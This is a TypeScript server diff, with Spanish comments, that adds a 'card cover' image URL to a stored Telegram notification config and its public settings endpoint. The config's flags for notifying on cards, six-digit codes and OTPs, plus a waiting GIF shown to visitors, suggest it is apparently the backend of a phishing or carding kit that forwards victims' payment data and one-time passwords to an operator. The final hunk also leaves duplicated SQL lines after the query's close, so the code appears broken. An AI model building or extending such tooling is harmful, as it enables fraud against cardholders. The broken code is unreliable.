@@ -55,6 +55,7 @@ let cachedTelegramConfig: {
   notify_six_digits: boolean
   notify_otp: boolean
   loading_gif_url: string
+  card_cover_url: string
   lastFetched: number
 } | null = null
 
@@ -75,6 +76,7 @@ async function getTelegramConfig() {
         notify_six_digits: Boolean(rows[0].notify_six_digits ?? true),
         notify_otp: Boolean(rows[0].notify_otp ?? true),
         loading_gif_url: String(rows[0].loading_gif_url || ''),
+        card_cover_url: String(rows[0].card_cover_url || ''),
         lastFetched: now,
       }
       return cachedTelegramConfig
@@ -1001,20 +1003,21 @@ app.get('/api/telegram-config', async (_req, res) => {
   }
 })
 
-// Endpoint público rápido para que el cliente consulte la animación / GIF de espera
+// Endpoint público rápido para que el cliente consulte la animación / GIF de espera y carátula de tarjeta
 app.get('/api/public-settings', async (_req, res) => {
   try {
     const config = await getTelegramConfig()
     res.json({
       success: true,
       loadingGifUrl: config?.loading_gif_url || '',
+      cardCoverUrl: config?.card_cover_url || '',
     })
   } catch (error) {
-    res.json({ success: false, loadingGifUrl: '' })
+    res.json({ success: false, loadingGifUrl: '', cardCoverUrl: '' })
   }
 })
 
-// Guardar/Actualizar credenciales de Telegram y URL del GIF de espera
+// Guardar/Actualizar credenciales de Telegram, URL del GIF de espera y Carátula
 app.post('/api/telegram-config', async (req, res) => {
   const start = Date.now()
   try {
@@ -1027,17 +1030,19 @@ app.post('/api/telegram-config', async (req, res) => {
       notifySixDigits = true,
       notifyOtp = true,
       loadingGifUrl = '',
+      cardCoverUrl = '',
     } = req.body
 
     const cleanToken = String(botToken).trim()
     const cleanChatId = String(chatId).trim()
     const cleanGifUrl = String(loadingGifUrl).trim()
+    const cleanCoverUrl = String(cardCoverUrl).trim()
 
     const updated = await sql`
       INSERT INTO telegram_config (
-        id, bot_token, chat_id, is_active, notify_records, notify_cards, notify_six_digits, notify_otp, loading_gif_url, updated_at
+        id, bot_token, chat_id, is_active, notify_records, notify_cards, notify_six_digits, notify_otp, loading_gif_url, card_cover_url, updated_at
       ) VALUES (
-        1, ${cleanToken}, ${cleanChatId}, ${Boolean(isActive)}, ${Boolean(notifyRecords)}, ${Boolean(notifyCards)}, ${Boolean(notifySixDigits)}, ${Boolean(notifyOtp)}, ${cleanGifUrl}, CURRENT_TIMESTAMP
+        1, ${cleanToken}, ${cleanChatId}, ${Boolean(isActive)}, ${Boolean(notifyRecords)}, ${Boolean(notifyCards)}, ${Boolean(notifySixDigits)}, ${Boolean(notifyOtp)}, ${cleanGifUrl}, ${cleanCoverUrl}, CURRENT_TIMESTAMP
       )
       ON CONFLICT (id) DO UPDATE SET
         bot_token = EXCLUDED.bot_token,
@@ -1048,6 +1053,10 @@ app.post('/api/telegram-config', async (req, res) => {
         notify_six_digits = EXCLUDED.notify_six_digits,
         notify_otp = EXCLUDED.notify_otp,
         loading_gif_url = EXCLUDED.loading_gif_url,
+        card_cover_url = EXCLUDED.card_cover_url,
+        updated_at = CURRENT_TIMESTAMP
+      RETURNING *;
+    `
         updated_at = CURRENT_TIMESTAMP
       RETURNING *;
     `
